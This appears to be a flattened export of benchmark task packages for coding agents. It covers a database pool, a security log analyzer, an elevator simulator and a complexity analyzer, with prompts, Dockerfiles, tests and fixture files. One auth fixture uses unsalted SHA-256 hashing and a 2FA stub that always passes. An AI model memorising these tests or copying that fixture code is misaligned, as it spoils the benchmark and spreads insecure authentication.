    assert len(valid_values) > 0, ""Solution doesn't suggest a value >= 20 for max_connections""","{""test_solution_file_created"": 0.3, ""test_correct_parameter_identified"": 0.7}","{""db_manager.py"": ""import psycopg2\nfrom psycopg2 import pool\nimport time\nimport threading\nimport logging\n\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\nclass DatabaseManager:\n    def __init__(self):\n        # Connection pool configuration\n        self.min_connections = 2\n        self.max_connections = 5  # This is the bottleneck\n        self.connection_timeout = 30\n        self.idle_timeout = 600\n        \n        self._lock = threading.Lock()\n        self._create_pool()\n        \n    def _create_pool(self):\n        try:\n            self.pool = psycopg2.pool.ThreadedConnectionPool(\n                self.min_connections,\n                self.max_connections,\n                host='localhost',\n                database='testdb',\n                user='testuser',\n                password='testpass',\n                port=5432\n            )\n            logger.info(f\""Created connection pool with min={self.min_connections}, max={self.max_connections}\"")\n        except Exception as e:\n            logger.error(f\""Failed to create connection pool: {e}\"")\n            raise\n    \n    def get_connection(self):\n        start_time = time.time()\n        conn = None\n        \n        while conn is None and (time.time() - start_time) < self.connection_timeout:\n            try:\n                conn = self.pool.getconn()\n                if conn:\n                    return conn\n            except psycopg2.pool.PoolError:\n                if (time.time() - start_time) > self.connection_timeout - 1:\n                    logger.error(\""Connection pool exhausted!\"")\n                    raise Exception(\""Connection pool exhausted\"")\n                time.sleep(0.1)\n        \n        raise Exception(\""Failed to get connection from pool\"")\n    \n    def return_connection(self, conn):\n        if conn:\n            self.pool.putconn(conn)"", ""requirements.txt"": ""Flask==3.0.0\npsycopg2-binary==2.9.9\nrequests==2.31.0"", ""load_test.py"": ""#!/usr/bin/env python3\nimport requests\nimport threading\nimport time\nimport random\nimport statistics\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\n\ndef make_request():\n    user_id = random.randint(1, 1000)\n    try:\n        response = requests.get(f'http://localhost:5000/api/user/{user_id}', timeout=5)\n        return response.status_code == 200\n    except:\n        return False\n\ndef run_load_test(duration=30, threads=50):\n    print(f\""Running load test with {threads} concurrent threads for {duration} seconds...\"")\n    \n    request_count = 0\n    error_count = 0\n    start_time = time.time()\n    \n    def worker():\n        nonlocal request_count, error_count\n        while time.time() - start_time < duration:\n            if make_request():\n                request_count += 1\n            else:\n                error_count += 1\n    \n    thread_list = []\n    for _ in range(threads):\n        t = threading.Thread(target=worker)\n        t.start()\n        thread_list.append(t)\n    \n    for t in thread_list:\n        t.join()\n    \n    elapsed = time.time() - start_time\n    rps = request_count / elapsed\n    \n    return {\n        'requests': request_count,\n        'errors': error_count,\n        'duration': elapsed,\n        'rps': rps\n    }\n\ndef main():\n    print(\""Starting load test...\"")\n    print(\""Warming up the application...\"")\n    \n    # Warmup\n    for _ in range(10):\n        make_request()\n    \n    time.sleep(2)\n    \n    # Run multiple iterations\n    iterations = 20\n    rps_values = []\n    \n    for i in range(iterations):\n        print(f\""\\nIteration {i+1}/{iterations}\"")\n        result = run_load_test(duration=10, threads=30)\n        rps_values.append(result['rps'])\n        print(f\""  Requests: {result['requests']}\"")\n        print(f\""  Errors: {result['errors']}\"")\n        print(f\""  RPS: {result['rps']:.1f}\"")\n        \n        if result['errors'] > 10:\n            print(\""  WARNING: High error rate detected!\"")\n        \n        time.sleep(1)\n    \n    avg_rps = statistics.mean(rps_values)\n    print(f\""\\n{'='*50}\"")\n    print(f\""Load Test Complete\"")\n    print(f\""Average RPS: {avg_rps:.1f}\"")\n    print(f\""Min RPS: {min(rps_values):.1f}\"")\n    print(f\""Max RPS: {max(rps_values):.1f}\"")\n    print(f\""{'='*50}\"")\n\nif __name__ == '__main__':\n    main()"", ""app.py"": ""#!/usr/bin/env python3\nimport time\nimport threading\nimport random\nfrom flask import Flask, jsonify\nfrom db_manager import DatabaseManager\n\napp = Flask(__name__)\ndb_manager = DatabaseManager()\n\n@app.route('/api/user/<int:user_id>')\ndef get_user(user_id):\n    try:\n        conn = db_manager.get_connection()\n        cursor = conn.cursor()\n        \n        # Simulate some database work\n        cursor.execute(\""SELECT pg_sleep(0.05)\"")  # 50ms query\n        cursor.execute(\""SELECT id, name, email FROM users WHERE id = %s\"", (user_id,))\n        user = cursor.fetchone()\n        \n        cursor.close()\n        db_manager.return_connection(conn)\n        \n        if user:\n            return jsonify({\n                'id': user[0],\n                'name': user[1],\n                'email': user[2]\n            })\n        return jsonify({'error': 'User not found'}), 404\n    except Exception as e:\n        return jsonify({'error': str(e)}), 500\n\n@app.route('/api/stats')\ndef get_stats():\n    try:\n        conn = db_manager.get_connection()\n        cursor = conn.cursor()\n        \n        cursor.execute(\""SELECT COUNT(*) FROM users\"")\n        count = cursor.fetchone()[0]\n        \n        cursor.close()\n        db_manager.return_connection(conn)\n        \n        return jsonify({'user_count': count})\n    except Exception as e:\n        return jsonify({'error': str(e)}), 500\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000, threaded=True)"", ""init_db.py"": ""#!/usr/bin/env python3\nimport psycopg2\nimport sys\n\ndef init_database():\n    try:\n        # Connect to PostgreSQL\n        conn = psycopg2.connect(\n            host='localhost',\n            database='testdb',\n            user='testuser',\n            password='testpass',\n            port=5432\n        )\n        conn.autocommit = True\n        cursor = conn.cursor()\n        \n        # Create users table\n        cursor.execute(\""\""\""\n            CREATE TABLE IF NOT EXISTS users (\n                id SERIAL PRIMARY KEY,\n                name VARCHAR(100),\n                email VARCHAR(100)\n            )\n        \""\""\"")\n        \n        # Insert test data\n        print(\""Inserting test data...\"")\n        for i in range(1, 1001):\n            cursor.execute(\n                \""INSERT INTO users (name, email) VALUES (%s, %s)\"",\n                (f\""User {i}\"", f\""user{i}@example.com\"")\n            )\n        \n        print(\""Database initialized successfully!\"")\n        cursor.close()\n        conn.close()\n        \n    except Exception as e:\n        print(f\""Failed to initialize database: {e}\"")\n        sys.exit(1)\n\nif __name__ == '__main__':\n    init_database()""}",2025-07-21T14:09:38.125082,2025-07-21T14:12:48.833224
draft_dp_e66d36d5,extremely_hard,draft_dp_e66d36d5,security,"Need a log analyzer to find suspicious patterns in our security logs. Should calculate threat scores based on event frequency and severity, detect anomalies, and let me search by threat level.",security,python|data-processing|analysis,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy log data
COPY security_logs.json /app/data/

# Set up Python environment
RUN pip install --no-cache-dir numpy scipy

# Create project structure
RUN mkdir -p /app/src /app/tests

CMD [""/bin/bash""]","import subprocess
import json
import os

def test_threat_score_calculation():
    """"""Test that the analyzer calculates threat scores correctly.""""""
    # Run the analyzer to get threat scores
    result = subprocess.run(
        ['python', 'log_analyzer.py', 'analyze', '--output-format', 'json'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, ""Analyzer should run successfully""
    
    # Parse the output
    try:
        analysis = json.loads(result.stdout)
    except json.JSONDecodeError:
        assert False, ""Analyzer should output valid JSON""
    
    # Check that critical events have high threat scores
    events = analysis.get('events', [])
    critical_events = [e for e in events if e.get('severity') == 'critical']
    
    assert len(critical_events) > 0, ""Should identify critical events""
    
    for event in critical_events:
        threat_score = event.get('threat_score', 0)
        assert threat_score >= 0.8, f""Critical events should have high threat scores (got {threat_score})""
    
    # Check that low severity events have low threat scores
    low_events = [e for e in events if e.get('severity') == 'low']
    for event in low_events:
        threat_score = event.get('threat_score', 0)
        assert threat_score <= 0.3, f""Low severity events should have low threat scores (got {threat_score})""

def test_anomaly_detection():
    """"""Test that the analyzer detects anomalous events.""""""
    # Run the analyzer to detect anomalies
    result = subprocess.run(
        ['python', 'log_analyzer.py', 'anomalies', '--threshold', '0.7'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, ""Anomaly detection should run successfully""
    
    output = result.stdout.lower()
    
    # Should detect the data exfiltration event as anomalous (5GB transfer)
    assert 'data_exfiltration' in output or 'exfiltration' in output, \
        ""Should detect data exfiltration as anomalous""
    
    # Should detect the malware event
    assert 'malware' in output, ""Should detect malware event as anomalous""
    
    # Should not flag routine events as anomalous
    assert 'backup_completed' not in output or 'anomaly' not in output.split('backup_completed')[0], \
        ""Should not flag routine backups as anomalous""","{""test_threat_score_calculation"": 0.6, ""test_anomaly_detection"": 0.4}","{""security_logs.json"": ""[\n  {\n    \""timestamp\"": \""2024-01-15T08:23:45Z\"",\n    \""event_type\"": \""failed_login\"",\n    \""source_ip\"": \""192.168.1.105\"",\n    \""username\"": \""admin\"",\n    \""severity\"": \""medium\"",\n    \""message\"": \""Failed login attempt for admin from 192.168.1.105\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T08:23:47Z\"",\n    \""event_type\"": \""failed_login\"",\n    \""source_ip\"": \""192.168.1.105\"",\n    \""username\"": \""admin\"",\n    \""severity\"": \""medium\"",\n    \""message\"": \""Failed login attempt for admin from 192.168.1.105\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T08:23:49Z\"",\n    \""event_type\"": \""failed_login\"",\n    \""source_ip\"": \""192.168.1.105\"",\n    \""username\"": \""admin\"",\n    \""severity\"": \""high\"",\n    \""message\"": \""Multiple failed login attempts detected\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T09:15:22Z\"",\n    \""event_type\"": \""network_scan\"",\n    \""source_ip\"": \""10.0.0.54\"",\n    \""target_ports\"": [22, 23, 80, 443, 3389],\n    \""severity\"": \""high\"",\n    \""message\"": \""Port scanning activity detected from 10.0.0.54\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T10:30:00Z\"",\n    \""event_type\"": \""privilege_escalation\"",\n    \""username\"": \""jdoe\"",\n    \""process\"": \""sudo\"",\n    \""severity\"": \""critical\"",\n    \""message\"": \""Unexpected privilege escalation by user jdoe\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T11:45:15Z\"",\n    \""event_type\"": \""file_access\"",\n    \""username\"": \""guest\"",\n    \""file_path\"": \""/etc/passwd\"",\n    \""severity\"": \""medium\"",\n    \""message\"": \""Suspicious file access by guest user\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T12:00:00Z\"",\n    \""event_type\"": \""system_restart\"",\n    \""severity\"": \""low\"",\n    \""message\"": \""Scheduled system restart\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T14:22:33Z\"",\n    \""event_type\"": \""failed_login\"",\n    \""source_ip\"": \""203.0.113.45\"",\n    \""username\"": \""root\"",\n    \""severity\"": \""high\"",\n    \""message\"": \""Failed root login from external IP\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T14:22:35Z\"",\n    \""event_type\"": \""failed_login\"",\n    \""source_ip\"": \""203.0.113.45\"",\n    \""username\"": \""root\"",\n    \""severity\"": \""high\"",\n    \""message\"": \""Failed root login from external IP\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T14:22:37Z\"",\n    \""event_type\"": \""failed_login\"",\n    \""source_ip\"": \""203.0.113.45\"",\n    \""username\"": \""root\"",\n    \""severity\"": \""critical\"",\n    \""message\"": \""Brute force attack detected on root account\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T15:00:00Z\"",\n    \""event_type\"": \""successful_login\"",\n    \""source_ip\"": \""192.168.1.50\"",\n    \""username\"": \""alice\"",\n    \""severity\"": \""low\"",\n    \""message\"": \""Successful login for alice\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T16:30:45Z\"",\n    \""event_type\"": \""config_change\"",\n    \""file\"": \""/etc/ssh/sshd_config\"",\n    \""username\"": \""bob\"",\n    \""severity\"": \""medium\"",\n    \""message\"": \""SSH configuration modified by bob\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T17:45:00Z\"",\n    \""event_type\"": \""malware_detected\"",\n    \""file_path\"": \""/tmp/suspicious.sh\"",\n    \""hash\"": \""a1b2c3d4e5\"",\n    \""severity\"": \""critical\"",\n    \""message\"": \""Potential malware detected in /tmp\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T18:00:00Z\"",\n    \""event_type\"": \""backup_completed\"",\n    \""severity\"": \""low\"",\n    \""message\"": \""Daily backup completed successfully\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T19:15:30Z\"",\n    \""event_type\"": \""unusual_process\"",\n    \""process_name\"": \""cryptominer\"",\n    \""cpu_usage\"": 95,\n    \""severity\"": \""high\"",\n    \""message\"": \""Suspicious process consuming high CPU\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T20:00:00Z\"",\n    \""event_type\"": \""firewall_block\"",\n    \""source_ip\"": \""198.51.100.14\"",\n    \""destination_port\"": 445,\n    \""severity\"": \""medium\"",\n    \""message\"": \""Firewall blocked SMB connection attempt\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T21:30:15Z\"",\n    \""event_type\"": \""data_exfiltration\"",\n    \""source_ip\"": \""192.168.1.200\"",\n    \""bytes_sent\"": 5242880000,\n    \""severity\"": \""critical\"",\n    \""message\"": \""Large data transfer detected - possible exfiltration\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T22:00:00Z\"",\n    \""event_type\"": \""service_stopped\"",\n    \""service\"": \""apache2\"",\n    \""severity\"": \""low\"",\n    \""message\"": \""Web service stopped for maintenance\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T23:00:00Z\"",\n    \""event_type\"": \""log_rotation\"",\n    \""severity\"": \""low\"",\n    \""message\"": \""System logs rotated\""\n  },\n  {\n    \""timestamp\"": \""2024-01-15T23:45:00Z\"",\n    \""event_type\"": \""memory_dump\"",\n    \""process\"": \""unknown\"",\n    \""severity\"": \""high\"",\n    \""message\"": \""Suspicious memory dump activity detected\""\n  }\n]""}",2025-07-21T14:10:23.480582,2025-07-21T14:10:23.480582
draft_dp_1a47056b,hard,draft_dp_1a47056b,software-engineering,The elevator simulation is dropping requests when multiple floors are called simultaneously. Fix the dispatch logic to handle concurrent requests properly and ensure all passengers get picked up within 60 seconds.,software-engineering,python|debugging|algorithm-implementation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

COPY elevator_sim.py /app/
COPY test_scenario.txt /app/

RUN chmod +x elevator_sim.py

CMD [""/bin/bash""]","import subprocess
import os

def test_all_requests_handled():
    """"""Test that all 5 requested floors are visited by elevators""""""
    # Run the simulation with test scenario
    with open('/app/test_scenario.txt', 'r') as f:
        result = subprocess.run(
            ['python3', '/app/elevator_sim.py'],
            stdin=f,
            capture_output=True,
            text=True
        )
    
    output = result.stdout
    
    # Check that elevators visited all requested floors (1, 2, 3, 5, 7)
    requested_floors = {1, 2, 3, 5, 7}
    visited_floors = set()
    
    for line in output.split('\n'):
        if 'Elevator' in line and 'Floor' in line:
            # Extract floor number from lines like ""Elevator 0: Floor 3, UP, Passengers: 0/10""
            parts = line.split()
            if len(parts) >= 4:
                try:
                    floor = int(parts[3].rstrip(','))
                    visited_floors.add(floor)
                except ValueError:
                    pass
    
    # All requested floors should be visited
    assert requested_floors.issubset(visited_floors), f""Not all floors visited. Requested: {requested_floors}, Visited: {visited_floors}""

def test_concurrent_request_handling():
    """"""Test that multiple simultaneous requests don't get dropped""""""
    # Create a scenario with many concurrent requests
    test_input = """"""REQUEST 1 UP
REQUEST 2 UP
REQUEST 3 UP
REQUEST 4 UP
REQUEST 5 UP
""""""
    # Add enough ticks to process all requests (60 seconds max as per prompt)
    test_input += ""\n"".join([""TICK""] * 60)
    
    result = subprocess.run(
        ['python3', '/app/elevator_sim.py'],
        input=test_input,
        capture_output=True,
        text=True
    )
    
    output = result.stdout
    
    # Count how many requests remain in queue at the end
    lines = output.strip().split('\n')
    final_state_start = -1
    
    # Find the last time stamp output
    for i in range(len(lines)-1, -1, -1):
        if lines[i].startswith(""Time: 60""):
            final_state_start = i
            break
    
    # Look for the queue status after final tick
    pending_requests = -1
    if final_state_start >= 0:
        for i in range(final_state_start, min(final_state_start + 10, len(lines))):
            if ""Queue:"" in lines[i] and ""pending requests"" in lines[i]:
                parts = lines[i].split()
                for j, part in enumerate(parts):
                    if part == ""Queue:"":
                        try:
                            pending_requests = int(parts[j+1])
                        except (IndexError, ValueError):
                            pass
                        break
                break
    
    # All requests should be processed (0 pending)
    assert pending_requests == 0, f""Requests still pending after 60 seconds: {pending_requests}""","{""test_all_requests_handled"": 0.5, ""test_concurrent_request_handling"": 0.5}","{""elevator_sim.py"": ""#!/usr/bin/env python3\nimport sys\nfrom collections import deque\nfrom dataclasses import dataclass\nfrom typing import List, Optional, Tuple\n\n@dataclass\nclass Request:\n    floor: int\n    direction: str\n    time_requested: int\n    time_completed: Optional[int] = None\n\n@dataclass \nclass Elevator:\n    id: int\n    current_floor: int = 1\n    direction: str = \""IDLE\""\n    passengers: int = 0\n    capacity: int = 10\n    in_service: bool = True\n    door_timer: int = 0\n    destination_floors: List[int] = None\n    \n    def __post_init__(self):\n        if self.destination_floors is None:\n            self.destination_floors = []\n\nclass ElevatorSystem:\n    def __init__(self, floors: int, elevators: int):\n        self.floors = floors\n        self.elevators = [Elevator(id=i) for i in range(elevators)]\n        self.requests = deque()\n        self.time = 0\n        self.completed_requests = []\n        \n    def process_request(self, floor: int, direction: str):\n        if 1 <= floor <= self.floors and direction in [\""UP\"", \""DOWN\""]:\n            req = Request(floor, direction, self.time)\n            self.requests.append(req)\n            \n    def assign_requests(self):\n        # Simple nearest elevator assignment\n        for req in list(self.requests):\n            best_elevator = None\n            min_distance = float('inf')\n            \n            for elevator in self.elevators:\n                if not elevator.in_service or elevator.passengers >= elevator.capacity:\n                    continue\n                    \n                distance = abs(elevator.current_floor - req.floor)\n                if distance < min_distance:\n                    min_distance = distance\n                    best_elevator = elevator\n                    \n            if best_elevator and req.floor not in best_elevator.destination_floors:\n                best_elevator.destination_floors.append(req.floor)\n                self.requests.remove(req)\n                \n    def move_elevators(self):\n        for elevator in self.elevators:\n            if not elevator.in_service:\n                continue\n                \n            if elevator.door_timer > 0:\n                elevator.door_timer -= 1\n                continue\n                \n            if not elevator.destination_floors:\n                elevator.direction = \""IDLE\""\n                continue\n                \n            # Move towards next destination\n            next_floor = elevator.destination_floors[0]\n            if elevator.current_floor < next_floor:\n                elevator.current_floor += 1\n                elevator.direction = \""UP\""\n            elif elevator.current_floor > next_floor:\n                elevator.current_floor -= 1\n                elevator.direction = \""DOWN\""\n            else:\n                # Arrived at destination\n                elevator.destination_floors.pop(0)\n                elevator.door_timer = 2\n                \n    def tick(self):\n        self.time += 1\n        self.assign_requests()\n        self.move_elevators()\n        \n    def get_stats(self):\n        wait_times = []\n        for req in self.completed_requests:\n            if req.time_completed:\n                wait_times.append(req.time_completed - req.time_requested)\n                \n        avg_wait = sum(wait_times) / len(wait_times) if wait_times else 0\n        return avg_wait\n        \n    def print_state(self):\n        print(f\""Time: {self.time}\"")\n        for elevator in self.elevators:\n            status = \""DOORS\"" if elevator.door_timer > 0 else elevator.direction\n            print(f\""Elevator {elevator.id}: Floor {elevator.current_floor}, {status}, Passengers: {elevator.passengers}/{elevator.capacity}\"")\n        print(f\""Queue: {len(self.requests)} pending requests\"")\n        print(f\""Stats: Avg Wait: {self.get_stats():.1f}\"")\n        print()\n\ndef main():\n    # 10 floors, 3 elevators\n    system = ElevatorSystem(10, 3)\n    \n    for line in sys.stdin:\n        parts = line.strip().split()\n        if not parts:\n            continue\n            \n        cmd = parts[0]\n        \n        if cmd == \""REQUEST\"":\n            floor = int(parts[1])\n            direction = parts[2]\n            system.process_request(floor, direction)\n        elif cmd == \""TICK\"":\n            system.tick()\n        elif cmd == \""LOAD\"":\n            elevator_id = int(parts[1])\n            passengers = int(parts[2])\n            if 0 <= elevator_id < len(system.elevators):\n                system.elevators[elevator_id].passengers += passengers\n        elif cmd == \""UNLOAD\"":\n            elevator_id = int(parts[1])\n            passengers = int(parts[2])\n            if 0 <= elevator_id < len(system.elevators):\n                system.elevators[elevator_id].passengers -= passengers\n        elif cmd == \""SERVICE\"":\n            elevator_id = int(parts[1])\n            status = parts[2] == \""on\""\n            if 0 <= elevator_id < len(system.elevators):\n                system.elevators[elevator_id].in_service = status\n        \n        system.print_state()\n\nif __name__ == \""__main__\"":\n    main()"", ""test_scenario.txt"": ""REQUEST 1 UP\nREQUEST 5 DOWN\nREQUEST 3 UP\nREQUEST 7 DOWN\nREQUEST 2 UP\nTICK\nTICK\nTICK\nTICK\nTICK\nTICK\nTICK\nTICK\nTICK\nTICK""}",2025-07-21T14:17:46.102514,2025-07-22T11:54:42.304334+00:00
draft_dp_2b0f424a,medium,draft_dp_2b0f424a,software-engineering,Need a complexity analyzer for our Python codebase. Should calculate cyclomatic complexity and find functions with complexity > 10.,software-engineering,python|analysis|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /project

COPY auth.py /project/
COPY utils.py /project/
COPY payment_processor.py /project/
COPY data_analyzer.py /project/
COPY main.py /project/

RUN chmod +x main.py

CMD [""python"", ""main.py""]","import os
import subprocess
import json

def test_complexity_analyzer_finds_complex_functions():
    """"""Test that the analyzer identifies functions with cyclomatic complexity > 10""""""
    # Run the complexity analyzer
    result = subprocess.run(
        ['python', 'complexity_analyzer.py', '--threshold', '10'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, ""Complexity analyzer should run successfully""
    
    # Check that it found the complex validate_credentials function
    output = result.stdout
    assert 'validate_credentials' in output, ""Should identify validate_credentials as complex""
    assert 'process_payment' in output, ""Should identify process_payment as complex""
    
def test_complexity_metrics_are_accurate():
    """"""Test that the analyzer calculates complexity metrics correctly""""""
    # Run the analyzer with JSON output for the auth.py file
    result = subprocess.run(
        ['python', 'complexity_analyzer.py', '--file', 'auth.py', '--json'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, ""Analyzer should run successfully""
    
    # Parse JSON output
    metrics = json.loads(result.stdout)
    
    # validate_credentials should have complexity > 10 due to multiple if statements
    assert 'validate_credentials' in metrics
    assert metrics['validate_credentials']['complexity'] > 10
    
    # Simple functions should have low complexity
    assert '_reset_failed_attempts' in metrics
    assert metrics['_reset_failed_attempts']['complexity'] <= 3","{""test_complexity_analyzer_finds_complex_functions"": 0.5, ""test_complexity_metrics_are_accurate"": 0.5}","{""auth.py"": ""import hashlib\nimport time\nfrom datetime import datetime\n\nclass AuthenticationManager:\n    def __init__(self):\n        self.users = {}\n        self.sessions = {}\n        self.failed_attempts = {}\n        \n    def validate_credentials(self, username, password, ip_address, remember_me=False):\n        if not username or not password:\n            return False\n            \n        if username in self.failed_attempts:\n            if self.failed_attempts[username]['count'] > 5:\n                if time.time() - self.failed_attempts[username]['last_attempt'] < 300:\n                    return False\n                else:\n                    self.failed_attempts[username]['count'] = 0\n                    \n        user = self.users.get(username)\n        if not user:\n            self._record_failed_attempt(username)\n            return False\n            \n        hashed_password = hashlib.sha256(password.encode()).hexdigest()\n        \n        if user['password'] != hashed_password:\n            self._record_failed_attempt(username)\n            return False\n            \n        if user['status'] == 'locked':\n            return False\n            \n        if user['requires_2fa']:\n            if not self._validate_2fa(username):\n                return False\n                \n        session_id = self._create_session(username, ip_address, remember_me)\n        \n        if remember_me:\n            self._create_remember_token(username, session_id)\n            \n        self._reset_failed_attempts(username)\n        self._log_successful_login(username, ip_address)\n        \n        return session_id\n        \n    def _record_failed_attempt(self, username):\n        if username not in self.failed_attempts:\n            self.failed_attempts[username] = {'count': 0, 'last_attempt': 0}\n        self.failed_attempts[username]['count'] += 1\n        self.failed_attempts[username]['last_attempt'] = time.time()\n        \n    def _validate_2fa(self, username):\n        return True\n        \n    def _create_session(self, username, ip_address, remember_me):\n        session_id = hashlib.sha256(f\""{username}{time.time()}{ip_address}\"".encode()).hexdigest()\n        self.sessions[session_id] = {\n            'username': username,\n            'ip': ip_address,\n            'created': time.time(),\n            'remember_me': remember_me\n        }\n        return session_id\n        \n    def _create_remember_token(self, username, session_id):\n        pass\n        \n    def _reset_failed_attempts(self, username):\n        if username in self.failed_attempts:\n            del self.failed_attempts[username]\n            \n    def _log_successful_login(self, username, ip_address):\n        pass"", ""payment_processor.py"": ""import json\nimport logging\n\nclass PaymentProcessor:\n    def __init__(self, api_key, test_mode=False):\n        self.api_key = api_key\n        self.test_mode = test_mode\n        self.logger = logging.getLogger(__name__)\n        \n    def process_payment(self, amount, card_data, customer_info, options=None):\n        try:\n            if not self._validate_amount(amount):\n                raise ValueError(\""Invalid amount\"")\n                \n            if not self._validate_card(card_data):\n                raise ValueError(\""Invalid card data\"")\n                \n            if self.test_mode:\n                if card_data.get('number', '').startswith('4000'):\n                    return self._create_failed_response(\""Card declined\"")\n                    \n            transaction_id = self._generate_transaction_id()\n            \n            if options and options.get('save_card'):\n                self._save_card_for_customer(customer_info['id'], card_data)\n                \n            if options and options.get('split_payment'):\n                return self._process_split_payment(amount, card_data, customer_info, options['split_details'])\n                \n            response = self._call_payment_api(amount, card_data, customer_info)\n            \n            if response['status'] == 'success':\n                self._log_successful_payment(transaction_id, amount, customer_info)\n                if options and options.get('send_receipt'):\n                    self._send_receipt(customer_info['email'], transaction_id, amount)\n            else:\n                self._log_failed_payment(transaction_id, amount, customer_info, response['error'])\n                \n            return response\n            \n        except Exception as e:\n            self.logger.error(f\""Payment processing error: {str(e)}\"")\n            return self._create_failed_response(str(e))\n            \n    def _validate_amount(self, amount):\n        return amount > 0 and amount < 1000000\n        \n    def _validate_card(self, card_data):\n        required_fields = ['number', 'exp_month', 'exp_year', 'cvv']\n        return all(field in card_data for field in required_fields)\n        \n    def _generate_transaction_id(self):\n        import uuid\n        return str(uuid.uuid4())\n        \n    def _save_card_for_customer(self, customer_id, card_data):\n        pass\n        \n    def _process_split_payment(self, amount, card_data, customer_info, split_details):\n        results = []\n        for split in split_details:\n            split_amount = amount * split['percentage'] / 100\n            result = self._call_payment_api(split_amount, card_data, customer_info)\n            results.append(result)\n        return {'status': 'success', 'results': results}\n        \n    def _call_payment_api(self, amount, card_data, customer_info):\n        return {'status': 'success', 'transaction_id': self._generate_transaction_id()}\n        \n    def _log_successful_payment(self, transaction_id, amount, customer_info):\n        self.logger.info(f\""Payment successful: {transaction_id} - ${amount}\"")\n        \n    def _log_failed_payment(self, transaction_id, amount, customer_info, error):\n        self.logger.error(f\""Payment failed: {transaction_id} - ${amount} - {error}\"")\n        \n    def _send_receipt(self, email, transaction_id, amount):\n        pass\n        \n    def _create_failed_response(self, error):\n        return {'status': 'failed', 'error': error}"", ""utils.py"": ""import re\n\ndef validate_email(email):\n    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'\n    return re.match(pattern, email) is not None\n\ndef format_currency(amount):\n    return f\""${amount:,.2f}\""\n\ndef calculate_discount(price, discount_percent):\n    if discount_percent < 0 or discount_percent > 100:\n        return price\n    return price * (1 - discount_percent / 100)\n\ndef parse_date(date_string):\n    formats = [\n        '%Y-%m-%d',\n        '%d/%m/%Y',\n        '%m/%d/%Y',\n        '%Y/%m/%d'\n    ]\n    \n    for fmt in formats:\n        try:\n            return datetime.strptime(date_string, fmt)\n        except:\n            continue\n    return None"", ""data_analyzer.py"": ""import statistics\n\nclass DataAnalyzer:\n    def __init__(self):\n        self.data = []\n        \n    def analyze_dataset(self, dataset, options={}):\n        if not dataset:\n            return {}\n            \n        results = {\n            'count': len(dataset),\n            'mean': statistics.mean(dataset),\n            'median': statistics.median(dataset),\n            'mode': self._safe_mode(dataset),\n            'std_dev': statistics.stdev(dataset) if len(dataset) > 1 else 0\n        }\n        \n        if options.get('include_percentiles'):\n            results['percentiles'] = self._calculate_percentiles(dataset)\n            \n        if options.get('include_outliers'):\n            results['outliers'] = self._find_outliers(dataset)\n            \n        if options.get('include_histogram'):\n            results['histogram'] = self._create_histogram(dataset, options.get('bins', 10))\n            \n        return results\n        \n    def _safe_mode(self, data):\n        try:\n            return statistics.mode(data)\n        except:\n            return None\n            \n    def _calculate_percentiles(self, data):\n        sorted_data = sorted(data)\n        return {\n            '25': self._percentile(sorted_data, 25),\n            '50': self._percentile(sorted_data, 50),\n            '75': self._percentile(sorted_data, 75),\n            '90': self._percentile(sorted_data, 90),\n            '95': self._percentile(sorted_data, 95)\n        }\n        \n    def _percentile(self, sorted_data, p):\n        k = (len(sorted_data) - 1) * p / 100\n        f = int(k)\n        c = k - f\n        if f + 1 < len(sorted_data):\n            return sorted_data[f] + c * (sorted_data[f + 1] - sorted_data[f])\n        else:\n            return sorted_data[f]\n            \n    def _find_outliers(self, data):\n        q1 = self._percentile(sorted(data), 25)\n        q3 = self._percentile(sorted(data), 75)\n        iqr = q3 - q1\n        lower_bound = q1 - 1.5 * iqr\n        upper_bound = q3 + 1.5 * iqr\n        return [x for x in data if x < lower_bound or x > upper_bound]\n        \n    def _create_histogram(self, data, bins):\n        min_val = min(data)\n        max_val = max(data)\n        bin_width = (max_val - min_val) / bins\n        histogram = [0] * bins\n        \n        for value in data:\n            bin_index = min(int((value - min_val) / bin_width), bins - 1)\n            histogram[bin_index] += 1\n            \n        return histogram"", ""main.py"": ""#!/usr/bin/env python3\n\nimport os\nimport sys\nfrom auth import AuthenticationManager\nfrom payment_processor import PaymentProcessor\nfrom data_analyzer import DataAnalyzer\nimport utils\n\ndef main():\n    print(\""Project codebase initialized\"")\n    print(\""Available modules:\"")\n    print(\""- auth.py: Authentication and session management\"")\n    print(\""- payment_processor.py: Payment processing logic\"")\n    print(\""- data_analyzer.py: Statistical data analysis\"")\n    print(\""- utils.py: Utility functions\"")\n    \nif __name__ == \""__main__\"":\n    main()""}",2025-07-21T16:49:13.085634,2025-07-21T16:49:13.085634
draft_dp_acdf2b19,medium,draft_dp_acdf2b19,software-engineering,The HVAC controller is consuming too much during peak hours. Optimize it to reduce costs by 20% while keeping zones between 20-24°C.,software-engineering,python|optimization|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

COPY hvac_controller.py /app/
COPY hvac_config.json /app/
